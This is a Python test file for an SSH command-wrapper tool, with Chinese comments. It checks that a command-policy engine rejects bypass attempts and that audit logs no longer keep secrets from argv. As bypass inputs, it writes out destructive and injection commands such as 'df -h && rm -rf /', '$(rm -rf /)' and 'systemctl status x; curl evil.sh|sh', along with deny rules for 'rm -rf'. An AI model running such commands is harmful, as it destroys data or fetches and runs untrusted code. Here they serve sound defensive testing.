"""P0 还真债：外部评审给出的绕过用例与真值修复。

本文件按 issue 分段，每条都对应 docs/DESIGN.md §5 里 P0 的一行：

  #28 策略语义：re.search → re.fullmatch，shell 元字符默认拒绝
  #29 vault.open 审计不再落 argv 里的秘密；--stdin 取值改为 --stdin / --stdin-file
  #30 setpass 不再丢 sudo / key_file / description
  #31 known_hosts 损坏不再静默降级成「谁都信」
  #32 put / get 的本地路径、大小与超时约束

运行：
    ~/.sshhh/venv/Scripts/python.exe tests/test_p0.py
"""

from __future__ import annotations

import json
import os
import shutil
import sys
import tempfile
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"
sys.path.insert(0, str(SCRIPTS))

_TMP = Path(tempfile.mkdtemp(prefix="sshhh-p0-"))
os.environ["SSHHH_DATA_DIR"] = str(_TMP)
os.environ.pop("SSHHH_MASTER", None)

from lib import paths, store  # noqa: E402

PASSED = 0
FAILED = 0


def check(name: str, cond: bool, detail: str = "") -> None:
    global PASSED, FAILED
    if cond:
        PASSED += 1
        print(f"  [ok] {name}")
    else:
        FAILED += 1
        print(f"  [FAIL] {name}" + (f"  -> {detail}" if detail else ""))


def reset() -> None:
    shutil.rmtree(_TMP, ignore_errors=True)
    _TMP.mkdir(parents=True, exist_ok=True)


def denied(policy: store.Policy, command: str, **kw) -> str | None:
    return policy.check(command, **kw)


# --------------------------------------------------------------------------
# #28 策略语义
# --------------------------------------------------------------------------


def test_policy_bypass_cases() -> None:
    """评审给出的四条绕过用例，全部必须转红。"""

    print("\n== #28 deny 被 && / ; 绕过 ==")
    p = store.Policy(deny=[r"^rm -rf"])
    r = denied(p, "df -h && rm -rf /")
    check("df -h && rm -rf / 被拒", r is not None, str(r))
    r = denied(p, "cd /tmp; rm -rf /")
    check("cd /tmp; rm -rf / 被拒", r is not None, str(r))
    r = denied(p, "df -h\nrm -rf /")
    check("换行拼接被拒", r is not None, str(r))
    r = denied(p, "df -h | tee /tmp/x")
    check("管道被拒", r is not None, str(r))
    r = denied(p, "$(rm -rf /)")
    check("命令替换被拒", r is not None, str(r))
    r = denied(p, "`rm -rf /`")
    check("反引号被拒", r is not None, str(r))
    r = denied(p, "cat /etc/passwd > /tmp/x")
    check("重定向被拒", r is not None, str(r))
    r = denied(p, "cat < /etc/passwd")
    check("输入重定向被拒", r is not None, str(r))

    print("\n== #28 allow 未锚定被 ; 绕过 ==")
    p = store.Policy(allow=["df -h"])
    check("df -h 本身放行", denied(p, "df -h") is None, str(denied(p, "df -h")))
    r = denied(p, "x; rm -rf /; df -h")
    check("x; rm -rf /; df -h 被拒", r is not None, str(r))
    r = denied(p, "df -h extra")
    check("fullmatch 不放过额外参数", r is not None, str(r))

    p = store.Policy(allow=[r"^systemctl status "])
    r = denied(p, "systemctl status x; curl evil.sh|sh")
    check("README 旧示例的绕过写法被拒", r is not None, str(r))

    print("\n== #28 fullmatch 语义 ==")
    p = store.Policy(deny=[r"^rm -rf.*"])
    check("deny 覆盖整族命令", denied(p, "rm -rf /") is not None)
    check("allow_shell 下 deny 仍是 fullmatch",
          denied(p, "cd /tmp; rm -rf /", allow_shell=True) is None,
          "没写 .* 的规则不该命中整串")
    p = store.Policy(allow=[r"^df -h$"])
    check("^df -h$ 放行 df -h", denied(p, "df -h") is None)
    check("^df -h$ 不放过 df -h 2>/dev/null",
          denied(p, "df -h 2>/dev/null", allow_shell=True) is not None)
    p = store.Policy(deny=["shutdown"])
    check("字面规则只匹配整串", denied(p, "shutdown") is not None
          and denied(p, "shutdown -h now") is None)

    print("\n== #28 allow_shell 放行元字符 ==")
    p = store.Policy()
    r = denied(p, "echo a && echo b", allow_shell=True)
    check("allow_shell 放行 &&", r is None, str(r))
    r = denied(p, "df -h 2>/dev/null", allow_shell=True)
    check("allow_shell 放行重定向", r is None, str(r))
    r = denied(p, "echo $HOME", allow_shell=True)
    check("allow_shell 放行 $", r is None, str(r))

    print("\n== #28 规则写坏不崩、不放开 ==")
    p = store.Policy(deny=["(unclosed"])
    try:
        r = denied(p, "ls -l")
        ok = True
    except Exception as exc:  # noqa: BLE001
        r, ok = None, False
        print(f"       异常：{exc}")
    check("非法正则不抛异常", ok)
    check("非法正则退化为字面比较", r is None, str(r))

    print("\n== #28 allow_shell 写进 hosts.toml 并读回 ==")
    reset()
    store.upsert_host(store.Host(name="shellbox", host="1.2.3.4", user="root",
                                 allow_shell=True))
    raw = paths.hosts_file().read_text(encoding="utf-8")
    check("清单里有 allow_shell = true", "allow_shell = true" in raw, raw)
    h = store.get("shellbox")
    check("读回来是 True", h is not None and h.allow_shell is True, str(h))
    store.upsert_host(store.Host(name="plain", host="5.6.7.8", user="root"))
    h2 = store.get("plain")
    check("没写就是 False", h2 is not None and h2.allow_shell is False, str(h2))


def test_audit_does_not_leak_argv() -> None:
    """vault.open 把整串 argv 落盘，等于把「随手写在命令里的秘密」也落盘。"""

    print("\n== #29 vault.open 不再落 argv 里的秘密 ==")
    reset()
    from lib import audit, vault

    master = "p0-master-passphrase-7d1"
    vault_secret = "VaultedPw!2026"
    v = vault.Vault.create(paths.vault_file(), master)
    v.set("prod", vault_secret)
    os.environ["SSHHH_MASTER"] = master

    secret = "S3cretValue123"
    saved = sys.argv[:]
    # 复刻 issue 里的实测调用：密码既在 --stdin 的值里，也在远端命令里
    sys.argv = ["sshhh.py", "run", "prod", "--stdin", secret,
                "mysql", "-u", "root", "-p" + secret]
    try:
        vault.open_vault()
    finally:
        sys.argv = saved

    text = paths.audit_file().read_text(encoding="utf-8")
    check("argv 里的临时秘密不落盘", secret not in text, text[-400:])
    check("库里已有的密码也不落盘", vault_secret not in text, text[-400:])
    check("主密码不落盘", master not in text, text[-400:])

    opens = [r for r in audit.tail(10) if r.get("action") == "vault.open"]
    last = opens[-1] if opens else {}
    command = str(last.get("command", ""))
    check("留下了 pid", f"pid={os.getpid()}" in command, command)
    check("留下了工作目录", "cwd=" in command, command)
    check("留下了可执行文件", "exe=" in command, command)
    check("只留前两个 argv 参数", "mysql" not in command, command)

    print("\n== #29 caller 字段删除 ==")
    os.environ["SSHHH_CALLER"] = "随便填的-agent"
    audit.write("test", host="h")
    os.environ.pop("SSHHH_CALLER", None)
    recs = audit.tail(10)
    check("审计记录里没有 caller", all("caller" not in r for r in recs), str(recs[-1]))
    check("自填的调用方名没被写进去",
          '"随便填的-agent"' not in paths.audit_file().read_text(encoding="utf-8"))

    print("\n== #29 --stdin 只接受 - ==")
    import sshhh as cli

    value_flags = {"timeout", "stdin", "stdin-file"}
    opts, pos = cli._parse(["hk", "--stdin", "-", "mysql"], value_flags)
    check("--stdin - 解析成值", opts.get("stdin") == "-", str(opts))
    check("命令不受影响", pos == ["hk", "mysql"], str(pos))

    opts, _ = cli._parse(["hk", "--stdin-file", "a.sql", "mysql"], value_flags)
    check("--stdin-file 解析成路径", opts.get("stdin-file") == "a.sql", str(opts))

    def usage_error(opts_dict: dict) -> str | None:
        try:
            cli._stdin_data(opts_dict)
        except cli.UsageError as exc:
            return str(exc)
        return None

    detail = usage_error({"stdin": secret})
    check("--stdin <值> 直接报错而不是默默放行", detail is not None, str(detail))
    check("错误里指出会进审计日志", detail is not None and "审计" in detail, str(detail))

    stdin_file = _TMP / "payload.sql"
    stdin_file.write_text("SELECT 1;\n", encoding="utf-8")
    check("--stdin-file 读得到内容",
          cli._stdin_data({"stdin-file": str(stdin_file)}) == "SELECT 1;\n")
    detail = usage_error({"stdin-file": str(_TMP / "missing.sql")})
    check("--stdin-file 文件不存在时报错", detail is not None, str(detail))


def main() -> int:
    test_policy_bypass_cases()
    test_audit_does_not_leak_argv()

    shutil.rmtree(_TMP, ignore_errors=True)
    print("\n" + "=" * 46)
    print(f"通过 {PASSED} 项，失败 {FAILED} 项")
    return 0 if FAILED == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
